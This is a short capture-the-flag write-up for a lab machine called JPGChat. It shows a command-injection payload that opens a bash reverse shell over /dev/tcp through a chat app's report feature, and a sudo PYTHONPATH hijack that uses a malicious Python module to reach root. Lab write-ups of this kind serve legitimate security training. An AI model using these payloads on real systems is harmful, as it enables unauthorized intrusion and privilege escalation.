JPGChat

Target IP: 10.10.117.181

Exploiting poorly made custom chatting service written in a certain language...

Scanning


There are two TCP ports open on the target machine.

Enumeration

Port 3000: Chat Application

Connecting to this port displays the message above. Apparently the source code of this application can be found online.


I obtained the source code of this application. Lines 13 and 14 are the most interesting as they are executed using os.system by the function [REPORT]. I can use command injection to gain a reverse shell connection.

Exploitation


Sending the payload ; /bin/bash -i >& /dev/tcp/10.14.55.153/8445 0>&1; using the [REPORT] functionality, I gained a reverse shell connection on port 8445 on my machine. Now I have a session on the target machine as the user wes.

Privilege Escalation


Running sudo -l shows the interesting entry above. Looks like I can use Python PATH environment variable to import a malicious module.


The Python script that can be executed imports a module called compare.


I created a module called compare.py at /tmp. This module contains the Python reverse shell script shown above. I started a listener on port 8446.


Then using the command sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/development/test_module.py in the terminal with the session as wes, I gained a root shell on port 8446.

Flags


The user.txt flag.


The root.txt flag.
